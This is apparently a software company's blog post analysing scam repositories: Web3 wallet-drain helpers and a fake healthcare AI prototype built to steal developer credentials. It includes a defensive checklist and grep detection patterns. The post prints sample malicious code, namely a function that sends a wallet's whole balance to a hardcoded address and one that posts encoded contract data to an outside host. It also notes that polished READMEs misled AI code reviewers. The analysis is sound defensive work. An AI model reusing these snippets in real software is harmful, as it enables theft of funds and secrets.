---
title: "A Short Story about Dealing with Malicious Code"
description: "A real-world analysis of a malicious healthcare repository that disguised itself as an AI prototype. Learn how Kmino uncovered hidden backdoors, identified red flags, and built a checklist for safely analyzing unknown codebases."
pubDate: 2025-10-27
image:
  url: https://images.unsplash.com/photo-1614064744993-dc3650ff1d25?ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&q=80&w=1740
  alt: Dealing with scam codebases cover
tags: [Tech, Business, Startup, Software Engineering]
author: "bruno"
---

# A Short Story about Dealing with Malicious Code

In our line of work at Kmino, it's not unusual that part of the discussion before we close a deal with a new partner revolves around analyzing codebases. This serves multiple purposes:

- It helps our potential partners evaluate our technical expertise.
- It allows our team to understand what we'd be getting into, from architecture to code quality.
- It informs our resource allocation and project estimation.
- And, perhaps most importantly, it ensures we can deliver safely and effectively.

When we receive code from unknown sources, we start with basic due diligence: analyzing the repository structure, checking commit history, reviewing collaborators’ profiles, running static analysis with AI-powered tools, and, if we need to execute the code, doing so in isolated environments built specifically for running untrusted applications.

However, this process also exposes us to unique security risks. Since we frequently clone and analyze external repositories, sometimes sent directly from prospective clients, we're a prime target for scammers trying to exploit that trust.

## The Usual Case

Given our history working with Web3 companies, we've encountered our fair share of scam repositories. Most of them are easy to spot; they typically contain malicious wallet interactions or functions designed to drain users' crypto wallets. A 15min analysis is enough to know what we're up against, and we usually don't lose too much time on those.

For example, we've seen code like this disguised as a "wallet integration helper":

```javascript
const approveWallet = async (provider) => {
  const accounts = await provider.request({ method: 'eth_requestAccounts' });
  const balance = await provider.getBalance(accounts[0]);
  
  await provider.request({
    method: 'eth_sendTransaction',
    params: [{
      from: accounts[0],
      to: "0xBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEAD",
      value: balance.toHexString()
    }],
  });
};
```
Or this one, pretending to be a "smart contract verification utility":

```javascript
async function verifyContract(contract) {
  const { address, abi } = contract;
  const payload = btoa(JSON.stringify({ address, abi }));
  await fetch("https://verify-helper.io/api", {
    method: "POST",
    body: payload,
  });
}
```

In both cases, the functions appear harmless or legitimate at first glance, but they're actually designed to exfiltrate private keys or drain funds.

This topic alone deserves its own article, so we'll get into more details on this later down the line.

This week, however, we stumbled upon something much more sophisticated and subtle, a scam outside the Web3 context entirely, disguised as a healthcare AI prototype. What makes it particularly dangerous is how good and professionally engineered it appeared.

That's worth sharing here.

## The Discovery

Recently, we analyzed what appeared to be a legitimate healthcare prototype repository titled "Healthcare MVP - AI-Powered Healthcare Prototype." At first glance, it seemed like a well-structured React/Node.js application with proper documentation, comprehensive features, and appropriate warnings about being prototype-only.

These warnings, specifically, apart from justifying incomplete features or non-production-ready code, also misdirected our AI. As the usual static review starts with reviewing the README, it sets the stage for a harmless codebase: "just a normal React/Node.js prototype".

Everything looked right. The database schema matches what the app was proposing to do; it used popular libs and common patterns, so at first look, it was all good.

After cloning the repo, my usual flow with AI goes like this:

- 1) Global Analysis of the repository: More obvious scams are usually found here.
- 2) Functions that interact with Web3 wallets: Obvious Web3 scams are stopped here
- 3) Functions that inject code into the browser: Also common scams
- 4) Check for the libraries used, and see if there are any suspicious ones
- 5) Check for what commands are executed on `npm dev`, as we saw some scams that do more here than just setting up the app

In neither of these 5 steps, did my AI trigger any warning. "Safe prototype", "nothing wrong". I was still suspicious. At the end, I was right: deeper investigation revealed this was actually a sophisticated scam designed to steal developer credentials and sensitive data. 

Here's how we uncovered the malicious intent and what you can learn from this experience.

## The Red Flags

### 1. **Suspicious Configuration File**

The most harmful evidence was found in `server/config/index.js`:

```javascript
export const setApiKey = (s) => atob(s);  // Base64 decode function
export const verify = (api) => axios.post(api);  // Makes HTTP POST to any URL
```

These functions were not used anywhere in the application and were there specifically for data exfiltration. `atob()` decodes hidden payloads, and the `verify()` function can send data to any external URL.

This is a classic malware pattern: unused functions that serve malicious purposes.

### 2. **Unrelated Content Mixing**

The same config file contained completely unrelated content:

- **Nepal district names** (75+ districts listed)
- **E-commerce order statuses** (active, approved, dispatched, canceled, etc)
- **Mail asset paths** for shopping cart illustrations

Nothing to do with a Healthcare app, which suggests the code was **copied from other projects** and hastily assembled.

### 3. **Repository Characteristics**

However, what launched the red flags waving in my head and encouraged a deeper investigation in the first place was simply how the repository was set up. Too many similarities with the scams I've seen before:

- **Single commit** 
- **Weird GitHub username**
- **Single Contributor**
- **Professional-looking facade** - designed to bypass security scrutiny
- **Comprehensive documentation** - makes it appear legitimate and confuses LLMs that see in these patterns professional intentions.

## The Health App Scam in Practice

In a nutshell:

1. **Social Engineering**: The repository looks well-documented, and the LinkedIn profile used to approach us was also well-crafted with connections, posts, and history
2. **Credential Harvesting**: Developers run `npm install` and `npm run dev`
3. **Data Exfiltration**: Hidden functions would steal:
   - API keys from environment variables
   - User credentials
   - System information
   - Network data

These guys mass message hundreds of profiles, add them to repositories, in the hopes someone will bite the bait. Don't be a victim, and report these profiles in whatever app they reached you through!

## Practical Tip to Protect Yourself

### 0. Leverage AI

Nowadays, there is no excuse not to use AI to do analysis on unknown codebases before you execute them. You can follow the steps I mentioned [here](#the-discovery) using Cursor, Copilot, and similar.

Alternatively, if you would prefer to do as the Incas did, you can follow the steps below.

### 1. **Always Inspect Configuration Files**

Before running any code, examine:
- `config/` directories
- Environment variable usage
- API key handling
- External service integrations

**Look for:**
- Unused functions (especially `atob`, `btoa`, `eval`)
- External HTTP requests (`fetch`, `axios.post`)
- Base64 encoding/decoding
- Suspicious imports or requires

### 2. **Analyze Repository Metadata**

Check these warning signs:
- **Single-commit** repositories
- **New or suspicious GitHub usernames**
- **Repositories with no history**
- **Mixed, unrelated content**
- **Generic or copied README files**

And, to be honest, perfect documentation. If you're analyzing a POC or an MVP, chances are that a real developer didn't bother to create such comprehensive docs for non-important code.

### 3. **Code Pattern Analysis**

Search for these malicious patterns:

```bash
# Search for dangerous functions
grep -r "eval\|Function\|atob\|btoa" .
grep -r "fetch\|XMLHttpRequest\|axios" .
grep -r "child_process\|spawn\|exec" .

# Look for external connections
grep -r "https://" . | grep -v "npmjs\|github"
grep -r "http://" . | grep -v "localhost"
```

### 4. **Environment Isolation**

If you cannot run away from actually having to execute the codebase, **always** use isolated environments. You can use VMBox to spin up a fresh machine isolated from your main environment. 

You can monitor the network traffic to see what calls are being made by the app and, if any API keys are needed to execute, always ask the person to provide them to you, or use disposable ones.

### 5. **Dependency Analysis**

Before running `npm install`:
- Review `package.json` for suspicious packages
- Check if dependencies match the project's stated purpose
- Look for packages with unusual names or low download counts
- Verify package integrity with `npm audit`

## Conclusion

At Kmino, we've built our reputation on technical due diligence, understanding a project deeply before committing to it. But this experience was a reminder that even for seasoned developers, professional-looking code can hide malicious intent, and this healthcare scam repository demonstrates how sophisticated modern malware can be.

The threat landscape continues to evolve, and as a software house constantly evaluating external codebases, keeping a healthy dose of skepticism always has paid off.

Remember: **When in doubt, don't run it out.** Your security instincts are usually your best defense against sophisticated scams like this one.

If you want to learn more about stories in tech, make sure to follow us on [LinkedIn](https://www.linkedin.com/company/kminotech/)!